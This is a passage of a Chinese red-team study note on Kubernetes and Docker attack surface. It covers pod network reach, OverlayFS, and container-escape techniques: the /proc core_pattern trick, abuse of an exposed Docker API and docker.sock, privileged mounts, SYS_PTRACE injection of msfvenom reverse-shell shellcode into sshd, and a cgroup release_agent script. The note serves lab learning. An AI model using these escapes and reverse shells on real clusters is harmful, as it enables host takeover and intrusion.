以 Kubernetes 为例，容器与容器之间的网络是极为特殊的。虽然大部分经典 IDC 内网的手法和技巧依然可以使用，但是容器技术所构建起来的是全新的内网环境，特别是当企业引入服务网格等云原生技术做服务治理时，整个内网和 IDC 内网的差别就非常大了；因此了解一下 Kubernetes 网络的默认设计是非常重要的，为了避免引入复杂的 Kubernetes 网络知识，我们以攻击者的视角来简述放在蓝军面前的 Kubernetes 网络。

![network](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/network.png)

从上图可以很直观的看出，当我们获取 Kubernetes 集群内某个容器的 shell，默认情况下我们可以访问以下几个内网里的目标：

1. 相同节点下的其它容器开放的端口
2. 其他节点下的其它容器开放的端口
3. 其它节点宿主机开放的端口
4. 当前节点宿主机开放的端口
5. Kubernetes Service 虚拟出来的服务端口
6. 内网其它服务及端口，主要目标可以设定为 APISERVER、ETCD、Kubelet 等

不考虑对抗和安装门槛的话，使用 masscan 和 nmap 等工具在未实行服务网格的容器网络内进行服务发现和端口探测和在传统的 IDC 网络里区别不大；当然，因为 Kubernetes Service 虚拟出来的服务端口默认是不会像容器网络一样有一个虚拟的 veth 网络接口的，所以即使 Kubernetes Service 可以用 IP:PORT 的形式访问到，但是是没办法以 ICMP 协议做 Service 的 IP 发现（Kubernetes Service 的 IP 探测意义也不大）。

另如果 HIDS、NIDS 在解析扫描请求时，没有针对 Kubernetes 的 IPIP Tunnle 做进一步的解析，可能产生一定的漏报。

注：若 Kubernetes 集群使用了服务网格，其中最常见的就是 istio，此时服务网格下的内网和内网探测手法变化是比较大的。可以参考引用中：《腾讯蓝军： CIS2020 - Attack in a Service Mesh》；由于 ISTIO 大家接触较少，此处不再展开。

也因此多租户集群下的默认网络配置是我们需要重点关注的，云产品和开源产品使用容器做多租户集群下的隔离和资源限制的实现并不少见，著名的产品有如 Azure Serverless、Kubeless 等。

若在设计多租户集群下提供给用户代码执行权限即容器权限的产品时，还直接使用 Kubernetes 默认的网络设计是不合理的且非常危险。

很明显一点是，用户创建的容器可以直接访问内网和 Kubernetes 网络。在这个场景里，合理的网络设计应该和云服务器 VPS 的网络设计一致，用户与用户之间的内网网络不应该互相连通，用户网络和企业内网也应该进行一定程度的隔离，上图中所有对内的流量路径都应该被切断。把所有用户 POD 都放置在一个 Kubernetes namespace 下就更不应该了。

### 5.4. 挂载目录

#### 5.4.1. OverlayFS概述

通过查看 /proc/self/mountinfo 或 /etc/mtab 可以知晓容器挂载信息（这里的/proc/self 软链接到 cat 命令进程）

挂载信息中有两个要点，第一点为overlay2的物理路径，图中可看到有 lowerdir、upperdir、workdir；第二点则为各挂载点的信息：

![mountinfo](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/mountinfo.png)

docker默认使用overlay2作为存储驱动 https://docs.docker.com/storage/storagedriver/select-storage-driver/ ，早期则使用aufs。

overrlay2存储驱动使用[OverlayFS](https://docs.docker.com/storage/storagedriver/overlayfs-driver/) 作为文件系统，OverlayFS有两种目录，分别为下层的 lowerdir 与上层的 upperdir ,这两个“图层”联合起来就是用户视图下感知到的 merged 。

其中 lowerdir 被确保为只读，也是镜像文件，确保可被不同镜像重复使用；而upperdir则是可读可写的。

![overlay_constructs](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/overlay_constructs.jpg)

另外，OverlayFS 通过 写时复制 技术来确保 lowerdir 的只读属性。当用户修改或删除某个文件，而这个文件还未存在于upperdir，则系统会将其从lowerdir复制一份到 workdir ，在workdir修改后复制到 upperdir ，此后在 upperdir 种确保了该文件的最新状态。简单来说，workdir不保存文件，只是一个中间的临时目录。

下面我们进行如下实验来验证：

```
容器中看到的根目录：
root@nginxtest:/# ls /
bin   cdk    dev                  docker-entrypoint.sh home  lib    lib64   media  opt   root   sbin  sys  usr
boot  ddddd  docker-entrypoint.d  etc            host  lib32  libx32  mnt    proc  run  srv   tmp  var

宿主机upperdir：
[root@node01 test]# ls /var/lib/docker/overlay2/f99e5195d09cc201ef78c82243dafe445a5b5f9759b19330410326d2ec5e4250/diff/
cdk  ddddd  etc  host  root  run  usr  var

容器上删除home目录
root@nginxtest:/# rm -r /home/

宿主机upperdir多个home目录删除的记录（C表示设备类型文件）：
[root@node01 test]# ls -la /var/lib/docker/overlay2/f99e5195d09cc201ef78c82243dafe445a5b5f9759b19330410326d2ec5e4250/diff/home
c--------- 1 root root 0, 0 Aug  4 00:41 /var/lib/docker/overlay2/f99e5195d09cc201ef78c82243dafe445a5b5f9759b19330410326d2ec5e4250/diff/home
```

可以通如下命令方便查看upperdir路径：

```
root@nginxtest:/# sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo
/var/lib/docker/overlay2/f99e5195d09cc201ef78c82243dafe445a5b5f9759b19330410326d2ec5e4250/diff

```

至于如何快速查找容器是否挂载了可以利用的目录，笔者目前没有找到这种方法，只能通过 mountinfo 看看是否有不常见的路径，并查看该路径下的内容，藉此进行判断。

cdk工具的信息收集模块  `Information Gathering - Mounts` （pkg/util/cgroup.go:68）可以辅助收集mount信息，但测试下来也只是起到输出 /etc/self/mountinfo的作用：

```
./cdk evaluate
```

![cdk_info](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/cdk_info.png)

#### 5.4.2. mounted /proc

如果容器挂载了宿主机的/proc，我们可以利用 /proc/sys/kernel/core_pattern 相关linux机制进行容器逃逸。

相关配置：

```
apiVersion: v1
kind: Pod
metadata:
  name: nginxtest
spec:
  containers:
  - name: nginx
    image: nginx
    ports:
    - containerPort: 80
    volumeMounts:
      - name: testvol
        mountPath: /host/testvol/proc
  volumes:
    - name: testvol
      hostPath:
        path: /proc
```

```
docker run -v /proc:/host_proc --rm -it nginx bash
```

在linux中，当程序奔溃退出时，默认会在程序当前工作目录下生成一个core文件，包含内存映像与调试信息，/proc/sys/kernel/core_pattern可以控制core文件保存位置和文件格式，当core_pattern的当一个字符为管道符时，系统会以root用户权限执行管道符后指定的文件。通过这样一个机制，我们可以在宿主机上执行任意命令从而进行逃逸。

下面复现如何通过 core_pattern 进行逃逸。

编译一个运行会奔溃的程序：

```
[root@master test]# cat test.c
#include <stdio.h>
int main(void)
{
    int *a = NULL;
    *a = 1;
    return 0;
}

[root@master test]# gcc test.c -o testc
[root@master test]# kubectl cp testc nginxtest:/testccat
```

填入proc路径后，在容器中运行如下命令：

```
PROC_DIR="/host/testvol/proc"
UPPERDIR=`sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo`
echo -e "|$UPPERDIR/mysh"> $PROC_DIR/sys/kernel/core_pattern

root@nginxtest:/# ./testc
Segmentation fault (core dumped)

```

### 5.5. manage docker 

https://gdevillele.github.io/engine/reference/api/docker_remote_api/

docker目前发行的版本（19.x）中，docker daemon默认监听 unix:///var/run/docker.sock （unix socket文件），而客户端需要有root权限才能访问该文件，通过该socket地址与daemon交互能操作docker相关 api ，从而进行容器创建、执行。

在旧版本的docker中（大致17年及之前的发行版本 <1.13.x ），docker daemon默认监听tcp socket 0.0.0.0:2375 ，且默认为未授权访问。

#### 5.5.1. docker remote api

我们修改配置，开启HTTP：

```
[Service]
Type=notify
# the default is not to use systemd for cgroups because the delegate issues still
# exists and systemd currently does not support the cgroup feature set required
# for containers run by docker
ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H tcp://0.0.0.0:2375
#ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock

```

随后重启相关服务

```
 systemctl daemon-reload
 systemctl restart docker
```

查看到的版本信息：

```
root@test:/home/test# curl http://192.168.128.130:2375/version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.9","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2020-05-15T00:24:05.000000000+00:00","Experimental":"false","GitCommit":"9d988398e7","GoVersion":"go1.13.10","KernelVersion":"3.10.0-1160.el7.x86_64","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.6.21","Details":{"GitCommit":"3dce8eb055cbb6872793272b4f20ed16117344f8"}},{"Name":"runc","Version":"1.1.7","Details":{"GitCommit":"v1.1.7-0-g860f061"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.9","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"9d988398e7","GoVersion":"go1.13.10","Os":"linux","Arch":"amd64","KernelVersion":"3.10.0-1160.el7.x86_64","BuildTime":"2020-05-15T00:24:05.000000000+00:00"}

```

创建容器，并指定特权、与主机共享network namespace、挂载宿主机文件系统：

```
root@test:/home/test# docker -H 192.168.128.130:2375 run --rm -it --privileged --net=host -v /:/mnt nginx /bin/bash
root@node01:/# ls /mnt
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

```

####  5.5.2. docker unix socket

当宿主机的 /var/run/docker.sock 被挂载容器内的时候，容器用户就可以直接通过该unix socket来操作docker api。

```
root@test:/home/test# curl --unix-socket /var/run/docker.sock foo/version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"23.0.4","Details":{"ApiVersion":"1.42","Arch":"amd64","BuildTime":"2023-04-14T10:32:03.000000000+00:00","Experimental":"false","GitCommit":"cbce331","GoVersion":"go1.19.8","KernelVersion":"5.15.0-78-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.6.20","Details":{"GitCommit":"2806fc1057397dbaeefbea0e4e17bddfbd388f38"}},{"Name":"runc","Version":"1.1.5","Details":{"GitCommit":"v1.1.5-0-gf19387a"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"23.0.4","ApiVersion":"1.42","MinAPIVersion":"1.12","GitCommit":"cbce331","GoVersion":"go1.19.8","Os":"linux","Arch":"amd64","KernelVersion":"5.15.0-78-generic","BuildTime":"2023-04-14T10:32:03.000000000+00:00"}
```

这种挂载daemon的unix socket通常出现在Docker in Docker的场景中，出现的案例有：

1. Serverless 的前置公共容器
2. 每个节点的日志容器

如果你已经获取了此类容器的 full tty shell, 你可以用类似下述的命令创建一个通往母机的 shell。

./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it --rm --name rshell -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest

如果想现在直接尝试此类逃逸利用的魅力，不妨可以试试 Google Cloud IDE 天然自带的容器逃逸场景，拥有 Google 账号可以直接点击下面的链接获取容器环境和利用代码，直接执行利用代码 try_google_cloud/host_root.sh 再 chroot 到 /rootfs 你就可以获取一个完整的宿主机 shell：

拥有google账户的情况下，通过以下链接我们可以直接测试该容器逃逸场景：

https://ssh.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/neargle/cloud_native_security_test_case.git

![google_test](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/google_test.png)

当然容器内部不一定有条件安装或运行 docker client，一般获取的容器 shell 其容器镜像是受限且不完整的，也不一定能安装新的程序，即使是用 pip 或 npm 安装第三方依赖包也很困难。

此时基于 golang 编写简易的利用程序，利用交叉编译编译成无需依赖的单独 bin 文件下载到容器内执行就是经常使用的方法了。

### 5.6. privileged container

特权容器表示容器进程继承了宿主机root的权限，这种权限包括：cgroups 、mount namespace、完整的capabilities 等等，而通常我们只要有其中一种资源的高级权限我们就可以进行容器逃逸了，所以特权模式下的容器逃逸有多种选择。

k8s创建特权容器：kubectl --kubeconfig /etc/kubernetes/admin.conf apply -f test.yaml

```
apiVersion: v1
kind: Pod
metadata:
  name: nginxtest
spec:
  containers:
  - name: nginx
    image: nginx
    ports:
    - containerPort: 80
    securityContext:
      privileged: true

```

如果不在 privileged 容器内部，是没有权限查看磁盘列表并操作挂载的。

![fdisk1](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/fdisk1.png)

特权容器中，可以查看到磁盘：

![fdisk2](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/fdisk2.png)

因此，在特权容器里，你可以把宿主机里的根目录 / 挂载到容器内部，从而去操作宿主机内的任意文件，如 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的。

![mount](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/mount.png)

### 5.7. capabilites

#### 5.7.1. Linux Capabilities

https://icloudnative.io/posts/linux-capabilities-why-they-exist-and-how-they-work/  Linux Capabilities入门

Linux Capabilities（Linux能力）是一种在Linux内核中引入的权限管理系统，用于细粒度地控制进程的权限。在传统的Linux权限模型中，进程要么具有完整的root权限（超级用户权限），要么具有普通用户的权限，这种二元权限模型可能存在安全风险。

为了增加安全性和降低攻击面，Linux引入了Linux Capabilities，使进程可以被赋予或剥夺特定的权限，而不必拥有完整的root权限。这样，进程可以在不破坏系统安全的前提下，仅具备执行特定任务所需的最小权限。

在Linux Capabilities中，每个能力（Capability）对应一个特定的权限，例如CAP_NET_ADMIN用于允许进行网络配置，CAP_SYS_PTRACE用于允许进行进程调试等。这样，管理员可以选择性地为进程分配这些特定的能力，而无需提供完整的root权限。这种细粒度的权限管理使得系统更加安全，并且提高了系统的安全性和灵活性。

在Docker和Kubernetes等容器技术中，Capabilities也被广泛用于为容器进程设置权限。通过合理地设置容器的Capabilities，可以确保容器内的进程只能获得必要的权限，从而增强了容器的安全性。

在Linux中，有许多不同的Capabilities（能力），用于细粒度地控制进程的权限。以下是一些常见的Capabilities及其简要说明：

1. CAP_CHOWN：修改文件所有者，允许进程修改任意文件的所有者。
2. CAP_DAC_OVERRIDE：覆盖文件访问权限，允许进程忽略文件访问权限检查。
3. CAP_DAC_READ_SEARCH：读取和搜索目录，允许进程读取和搜索任意目录。
4. CAP_FOWNER：修改文件所有者和组，允许进程修改任意文件的所有者和所属组。
5. CAP_FSETID：设置文件的setuid和setgid位，允许进程设置文件的setuid和setgid位。
6. CAP_KILL：发送信号给其他进程，允许进程发送信号给任意进程。
7. CAP_SETGID：设置组ID，允许进程在执行时改变自己的有效组ID。
8. CAP_SETUID：设置用户ID，允许进程在执行时改变自己的有效用户ID。
9. CAP_SETPCAP：设置线程的能力，允许进程提高自己或其他线程的能力。
10. CAP_LINUX_IMMUTABLE：修改不可变的文件，允许进程修改标记为不可变的文件。
11. CAP_NET_BIND_SERVICE：绑定网络端口，允许进程绑定小于1024的网络端口。
12. CAP_NET_RAW：使用原始网络套接字，允许进程使用原始网络套接字发送和接收网络数据包。
13. CAP_IPC_LOCK：锁定内存页，允许进程锁定内存页，防止被交换出去。
14. CAP_MKNOD：创建设备文件和FIFOs，允许进程创建设备文件和FIFOs（命名管道）。
15. CAP_SYS_ADMIN：系统管理权限，允许执行各种系统管理任务，例如挂载文件系统、设置主机名等。
16. CAP_SYS_BOOT：引导作业管理，允许进程引导或重启作业控制会话。
17. CAP_SYS_CHROOT：改变根目录，允许进程改变根文件系统的根目录。
18. CAP_SYS_PTRACE：进程调试权限，允许进程调试其他进程。
19. CAP_SYS_TIME：更改系统时钟，允许进程更改系统时钟和设置实时时钟。
20. CAP_SYS_TTY_CONFIG：配置TTY设备，允许进程配置TTY设备。

Linux中的Capabilities有很多，这里只是列举，且不同的Linux发行版和内核版本可能支持不同的Capabilities。

#### 5.7.2. 收集Capabilities信息

通过 capsh --print 命令可以打印当前容器的capablities权限信息

![capsh](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/capsh.png)

容器中的工具通常都被精简了，所以没有capsh这个工具，我们可以通过获取hex记录值后，再在其他机器进行解码，即可获取该信息。

```
root@nginxtest:~# cat /proc/1/status | grep Cap
CapInh: 0000001fffffffff
CapPrm: 0000001fffffffff
CapEff: 0000001fffffffff
CapBnd: 0000001fffffffff
CapAmb: 0000000000000000

```

```
[test@master ~]$ capsh --decode=0000001fffffffff
0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36

```

#### 5.7.3. SYS_PTRACE

相关配置参考如下，除了添加SYS_PTRACE外，还需要允许容器访问主机pid namespace

```
docker run --pid=host --cap-add=SYS_PTRACE --rm -it ubuntu bash
```

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginxtest
spec:
  containers:
  - name: nginx
    image: nginx
    ports:
    - containerPort: 80
    securityContext:
      capabilities:
        add:
          - SYS_PTRACE
  hostPID: true
  
```

![ls_proc](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/ls_proc.png)

下面复现该场景下通过进程注入反弹宿主机shell到容器上。

本机上安装msf，用于生成shellcode

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

获取容器ip地址：10.245.1.45

```
root@nginxtest2:/# ./cdk ifconfig
2023/08/08 07:17:18 [+] run ifconfig, using GetLocalAddresses()
2023/08/08 07:17:18 lo 127.0.0.1/8
2023/08/08 07:17:18 eth0 10.245.1.45/24

```

生成shellcode：

```
[root@master test]# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.245.1.45 LPORT=8888 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of c file: 338 bytes
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x22\xb8\x0a\xf5\x01\x2d\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";

```

填入  https://raw.githubusercontent.com/0x00pf/0x00sec_code/master/mem_inject/infect.c

```
#define SHELLCODE_SIZE 74

unsigned char *shellcode = ..

```

编译后传到容器中

```
gcc infect.c -o infect
```

本地编译netcat传到容器执行：

```
root@nginxtest2:/# ./netcat -lvp 8888
Connection from 10.245.1.1:55612

```

这里选择ssh进程注入，执行后netcat接收到反弹shell：

```
root@nginxtest2:/# ./cdk ps | grep ssh
root    940     1       /usr/sbin/sshd
root    47815   940     /usr/sbin/sshd
        47818   47815   /usr/sbin/sshd
root@nginxtest2:/# ./infect 940
+ Tracing process 940
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7f2eebf2d983
+ Setting instruction pointer to 0x7f2eebf2d985
+ Run it!
```



#### 5.7.4. SYS_ADMIN & cgroup

`SYS_ADMIN` 权限是Linux中的一个特权权限，拥有这个权限的进程能够执行系统管理任务，包括文件系统的挂载和卸载、修改系统时间、配置网络、加载内核模块等，其中包括对cgroup的配置和操作。

Cgroup是Linux内核中的一个功能，用于将一组进程组织成一个或多个控制组。这些控制组可以被用于限制、监控和分配系统资源，例如CPU、内存、磁盘IO等。容器技术（如Docker、LXC等）通常使用Cgroup来实现容器内资源的隔离和限制，确保容器内的进程不会过度消耗主机资源。

配置demo如下：

```
	
docker run --cap-add=SYS_ADMIN --security-opt apparmor=unconfined -it ubuntu bash
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginxtest
spec:
  containers:
  - name: nginx
    image: nginx
    ports:
    - containerPort: 80
    securityContext:
      capabilities:
        add:
          - SYS_ADMIN
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
```

由于我们需要让容器启动后一直运行某个命令，否则会测试不成功，暂时不清楚原理：

```
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]

    command: ["/bin/bash","-ce","tail -f /dev/null"]
```



cgroup release_agentCgroup逃逸的原理通常涉及以下几个步骤：

利用命令如下，参考 [privileged/1-host-ps.sh]( https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh)，目前测试执行1次后就不能再执行，后续需要理解后改进：

```sh
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

cat >/tmp/test.sh<<EOF
#!/bin/sh
touch /tmp/success
EOF

chmod +x /tmp/test.sh

echo "$host_path/tmp/test.sh" > /tmp/cgrp/release_agent

echo 1 > /tmp/cgrp/x/notify_on_release

echo $$ > /tmp/cgrp/x/cgroup.procs
```



## 6. 结语

&emsp;&emsp;k8s攻防主要包括k8s 组件、服务、认证机制、插件、容器逃逸 、相关漏洞，及在后渗透使用到的权限维持、动态准入中间人攻击等，而本文主要带大家学习了主要的组件、认证机制 和部分逃逸问题。

&emsp;&emsp;当然，在云原生角度上来看，我们还需要关注各云原生的组件：网关、k8s apiserver相关的二开、镜像及供应方 等等。

&emsp;&emsp;后续快速深入理解云原生下的攻防问题的途径就是复现学习各组件漏洞，这也可能是笔者后续的课题。

## 7. Reference&补充

https://github.com/neargle/my-re0-k8s-security 从零开始的Kubernetes攻防

https://icloudnative.io/posts/linux-capabilities-why-they-exist-and-how-they-work/ Linux Capabilities 入门教程：概念篇

收藏的githuh项目：https://github.com/stars/turn1tup/lists/cloudsec

蹦床攻击 @谢黎 http://xx/knowledge/info/PxcFloYBbZmy7XShUw-a/#_0

SYS_PTRACE 抓取SSH密码、SYS_MODULE https://bbs.kanxue.com/thread-276813.htm 云攻防之容器逃逸与k8s攻击手法

SYS_ADMIN devices.allow http://blog.nsfocus.net/docker/ 容器逃逸手法实践-危险配置与挂载篇

CAP_DAC_READ_SEARCH  CAP_DAC_OVERRIDE @张健  http://xx/knowledge/info/nCApoIYBbZmy7XShGfDS/

lxcfs逃逸 https://github.com/neargle/my-re0-k8s-security#52-%E6%94%BB%E5%87%BB-lxcfs

历史漏洞可参考CDK wiki，及信息收集模块功能 https://github.com/cdk-team/CDK/wiki/CDK-Home-CN#exploit-%E6%A8%A1%E5%9D%97

Istio CVE-2022-2170 https://mp.weixin.qq.com/s/Y4F72s0JSyvjLBN3iNyUZg https://www.anquanke.com/post/id/272528

